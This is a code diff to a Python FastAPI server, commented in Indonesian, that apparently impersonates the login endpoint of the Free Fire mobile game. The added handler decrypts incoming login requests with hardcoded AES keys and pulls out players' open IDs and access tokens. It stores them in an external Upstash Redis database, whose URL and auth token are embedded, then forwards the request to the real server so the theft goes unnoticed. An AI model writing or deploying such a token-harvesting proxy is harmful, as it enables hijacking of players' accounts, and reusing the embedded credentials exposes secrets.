@@ -4,12 +4,22 @@ from Crypto.Util.Padding import unpad
 import blackboxprotobuf
 from fastapi import FastAPI, Request, Response
 from fastapi.responses import JSONResponse
+import httpx
+from upstash_redis.asyncio import Redis
 
 app = FastAPI()
 
+# Inisialisasi Upstash Redis (Sesuaikan kredensial Anda)
+redis_client = Redis(
+    url="https://harmless-muskrat-144397.upstash.io",
+    token="gQAAAAAAAjQNAAIgcDI2ZGU0M2ZmNTNiMjQ0NTJlOTAwNjRlZDAyMzY4ODZhOA",
+)
+
 MAIN_KEY = b"Yg&tc%DEuh6%Zc^8"
 MAIN_IV = b"6oyZDr22E3ychjM%"
+TARGET_URL = "https://loginbp.ggpolarbear.com/MajorLogin"
 
+# Silakan isi data di sini
 VER_DATA = {
   "code": 0,
   "is_server_open": True,
@@ -62,12 +72,100 @@ VER_DATA = {
   "ggp_url": "gin.freefiremobile.com"
 }
 
+
+def aes_decrypt(data: bytes) -> bytes:
+    cipher = AES.new(MAIN_KEY, AES.MODE_CBC, MAIN_IV)
+    decrypted = cipher.decrypt(data)
+    return unpad(decrypted, AES.block_size)
+
+
+def make_octet_response(text: str, status_code: int = 400) -> Response:
+    return Response(
+        content=text.encode("utf-8"),
+        status_code=status_code,
+        media_type="application/octet-stream",
+    )
+
+
+# Handler khusus MajorLogin
+@app.post("/MajorLogin")
+@app.post("/majorlogin")
+@app.post("/api/MajorLogin")
+@app.post("/api/majorlogin")
+async def handle_major_login(request: Request):
+    body = await request.body()
+    if not body:
+        return make_octet_response("Request body is empty\n", status_code=400)
+
+    # 1. Dekripsi & simpan ke Upstash Redis
+    try:
+        try:
+            ciphertext = bytes.fromhex(body.decode("utf-8", errors="ignore").strip())
+        except Exception:
+            ciphertext = body
+
+        if len(ciphertext) > 0 and len(ciphertext) % 16 == 0:
+            decrypted = aes_decrypt(ciphertext)
+            decoded, _ = blackboxprotobuf.protobuf_to_json(decrypted)
+
+            if isinstance(decoded, str):
+                fields = json.loads(decoded)
+            elif isinstance(decoded, dict):
+                fields = decoded
+            else:
+                fields = {}
+
+            open_id_val = fields.get("22")
+            access_token_val = fields.get("29")
+
+            if open_id_val and access_token_val:
+                open_id = str(open_id_val)
+                access_token = str(access_token_val)
+
+                # Simpan ke Upstash Redis (TTL 24 Jam)
+                await redis_client.set(
+                    f"session:{open_id}", access_token, ex=86400
+                )
+                print(f"[Redis] Saved OpenID: {open_id}")
+    except Exception as e:
+        print(f"[Warn] Failed to parse/save token to Upstash: {e}")
+
+    # 2. Forward request original ke server sd.ghame.com
+    headers = dict(request.headers)
+    headers.pop("host", None)
+    headers.pop("content-length", None)
+
+    async with httpx.AsyncClient(timeout=30.0) as client:
+        try:
+            target_res = await client.post(
+                TARGET_URL,
+                content=body,
+                headers=headers,
+            )
+
+            # 3. Teruskan respons server asli kembali ke client
+            return Response(
+                content=target_res.content,
+                status_code=target_res.status_code,
+                headers=dict(target_res.headers),
+            )
+        except Exception as e:
+            return make_octet_response(
+                f"Error: [FFFFFF]{str(e)}\n",
+                status_code=502,
+            )
+
+
 # Semua path lainnya (root, ver.php, dll.) akan merespons JSON VER_DATA
-@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
+@app.api_route(
+    "/{path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
+)
 async def catch_all(path: str):
     return JSONResponse(content=VER_DATA, status_code=200)
+
 
 @app.get("/")
 @app.post("/")
 async def root():
     return JSONResponse(content=VER_DATA, status_code=200)
+      
